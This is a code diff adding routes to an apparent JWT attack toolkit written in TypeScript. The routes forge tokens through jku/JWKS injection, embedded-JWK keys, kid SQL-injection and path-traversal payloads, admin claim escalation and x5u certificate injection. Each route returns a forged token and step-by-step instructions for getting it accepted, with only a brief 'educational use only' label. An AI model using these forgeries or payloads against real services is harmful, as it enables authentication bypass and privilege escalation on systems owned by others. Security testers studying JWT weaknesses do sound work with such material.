@@ -150,6 +150,175 @@ router.post("/crack", (req, res) => {
   }
 });
 
+// ── JWKS injection — forge a token with jku/x5u pointing to an attacker-controlled JWKS ──
+router.post("/jwks-inject", (req, res) => {
+  const { token, jwksUrl } = req.body as { token?: string; jwksUrl?: string };
+  if (!token || !jwksUrl) return res.status(400).json({ error: "token and jwksUrl required" });
+  try {
+    const { header, payload, parts } = decodeJwt(token);
+    const forgedHeader = { ...header, jku: jwksUrl };
+    delete forgedHeader.x5u;
+    const h = Buffer.from(JSON.stringify(forgedHeader)).toString("base64url");
+    const p = parts[1];
+    const forgedToken = `${h}.${p}.REPLACE_WITH_VALID_SIG`;
+    const exampleJwks = {
+      keys: [{
+        kty: "RSA",
+        kid: header.kid || "attacker-key",
+        use: "sig",
+        alg: "RS256",
+        n: "REPLACE_WITH_YOUR_RSA_MODULUS",
+        e: "AQAB",
+      }]
+    };
+    res.json({
+      forgedToken,
+      description: "The jku header now points to your JWKS endpoint. If the server fetches the JWKS from this URL to verify the token, you control which key is used for verification.",
+      step1: "Host a JWKS JSON at the jwksUrl containing your RSA public key",
+      step2: "Sign the token with your RSA private key",
+      step3: "Submit the forged token — the server will fetch your key and accept it",
+      exampleJwks,
+      warning: "Educational use only — test only on systems you own or have permission to test.",
+    });
+  } catch (e: any) {
+    res.status(400).json({ error: e.message });
+  }
+});
+
+// ── Embedded JWK attack — put attacker's public key directly in the header ──
+router.post("/embedded-jwk", (req, res) => {
+  const { token } = req.body as { token?: string };
+  if (!token) return res.status(400).json({ error: "token required" });
+  try {
+    const { header, parts } = decodeJwt(token);
+    const { privateKey, publicKey } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
+    const pubDer = publicKey.export({ type: "pkcs1", format: "der" }) as Buffer;
+    const privPem = privateKey.export({ type: "pkcs8", format: "pem" }) as string;
+    const jwk = {
+      kty: "RSA",
+      n: pubDer.slice(9, 9 + 256).toString("base64url"),
+      e: "AQAB",
+      alg: "RS256",
+      use: "sig",
+    };
+    const forgedHeader = { ...header, alg: "RS256", jwk };
+    delete forgedHeader.jku;
+    delete forgedHeader.x5u;
+    const h = Buffer.from(JSON.stringify(forgedHeader)).toString("base64url");
+    const p = parts[1];
+    const sig = crypto.sign("sha256", Buffer.from(`${h}.${p}`), privateKey);
+    const forgedToken = `${h}.${p}.${sig.toString("base64url")}`;
+    res.json({
+      forgedToken,
+      privateKeyPem: privPem,
+      description: "An RSA keypair was generated server-side. The attacker's public key is embedded in the jwk header field. If the server trusts the embedded JWK instead of a pre-configured key, it will accept this forged token.",
+      warning: "Educational use only.",
+    });
+  } catch (e: any) {
+    res.status(400).json({ error: e.message });
+  }
+});
+
+// ── kid SQL injection ──
+router.post("/kid-injection", (req, res) => {
+  const { token } = req.body as { token?: string };
+  if (!token) return res.status(400).json({ error: "token required" });
+  try {
+    const { header, payload } = decodeJwt(token);
+    const payloads = [
+      { label: "SQL UNION — force empty key", kid: "' UNION SELECT '\\x00'--" },
+      { label: "SQL OR 1=1 — bypass key lookup", kid: "' OR 1=1--" },
+      { label: "Path traversal — use /dev/null as key", kid: "../../dev/null" },
+      { label: "Path traversal — force empty file", kid: "../../../../../../../dev/null" },
+      { label: "NULL byte injection", kid: "key\x00injected" },
+      { label: "SQLite — force null key", kid: "' UNION SELECT NULL--" },
+    ];
+    const results = payloads.map((p) => {
+      const injectedHeader = { ...header, kid: p.kid };
+      const h = Buffer.from(JSON.stringify(injectedHeader)).toString("base64url");
+      const pl = Buffer.from(JSON.stringify(payload)).toString("base64url");
+      const data = `${h}.${pl}`;
+      const sig = crypto.createHmac("sha256", "").update(data).digest("base64url");
+      return {
+        label: p.label,
+        kid: p.kid,
+        forgedToken: `${data}.${sig}`,
+        signingSecret: "(empty string — works if kid resolves to null/empty key)",
+      };
+    });
+    res.json({
+      results,
+      description: "The kid (key ID) header value is injected into SQL or filesystem lookups. If not sanitized, this can redirect key resolution to attacker-controlled values or force an empty/null signing key.",
+      warning: "Educational use only.",
+    });
+  } catch (e: any) {
+    res.status(400).json({ error: e.message });
+  }
+});
+
+// ── Claim escalation — modify role/admin claims ──
+router.post("/claim-escalate", (req, res) => {
+  const { token, targetClaims } = req.body as { token?: string; targetClaims?: Record<string, any> };
+  if (!token) return res.status(400).json({ error: "token required" });
+  try {
+    const { header, payload, parts } = decodeJwt(token);
+    const defaultEscalations: Record<string, any> = {
+      role: "admin",
+      is_admin: true,
+      admin: true,
+      scope: "admin:all read:all write:all delete:all",
+      groups: ["admin", "superuser", "staff"],
+      type: "admin",
+      level: 0,
+      plan: "enterprise",
+      permissions: ["*"],
+    };
+    const escalated = { ...payload, ...defaultEscalations, ...(targetClaims || {}) };
+    const h = parts[0];
+    const p = Buffer.from(JSON.stringify(escalated)).toString("base64url");
+    const algIsNone = header.alg === "none" || !header.alg;
+    let forgedToken: string;
+    if (algIsNone) {
+      forgedToken = `${h}.${p}.`;
+    } else {
+      forgedToken = `${h}.${p}.INVALID_SIG_REPLACE_OR_USE_KNOWN_SECRET`;
+    }
+    res.json({
+      originalClaims: payload,
+      escalatedClaims: escalated,
+      forgedToken,
+      description: "Common privilege-escalation claims have been injected. If the server reads role/admin from JWT without re-validating against DB, the escalation may succeed.",
+      needsSignature: !algIsNone,
+      warning: "Educational use only.",
+    });
+  } catch (e: any) {
+    res.status(400).json({ error: e.message });
+  }
+});
+
+// ── X5U header injection — point x5u to attacker certificate ──
+router.post("/x5u-inject", (req, res) => {
+  const { token, x5uUrl } = req.body as { token?: string; x5uUrl?: string };
+  if (!token || !x5uUrl) return res.status(400).json({ error: "token and x5uUrl required" });
+  try {
+    const { header, parts } = decodeJwt(token);
+    const forgedHeader = { ...header, x5u: x5uUrl };
+    delete forgedHeader.jku;
+    const h = Buffer.from(JSON.stringify(forgedHeader)).toString("base64url");
+    const forgedToken = `${h}.${parts[1]}.REPLACE_WITH_VALID_SIG`;
+    res.json({
+      forgedToken,
+      description: "The x5u header points to an attacker-controlled X.509 certificate URL. If the server fetches and trusts this certificate for signature verification, the forged token will be accepted.",
+      step1: "Host a self-signed X.509 certificate (PEM) at the x5uUrl",
+      step2: "Sign the token with the private key matching that certificate",
+      step3: "Submit — the server verifies against your certificate",
+      warning: "Educational use only.",
+    });
+  } catch (e: any) {
+    res.status(400).json({ error: e.message });
+  }
+});
+
 // RS256→HS256 key confusion attack (educational — just shows the forged structure)
 router.post("/key-confusion", (req, res) => {
   const { token, publicKey } = req.body as { token?: string; publicKey?: string };
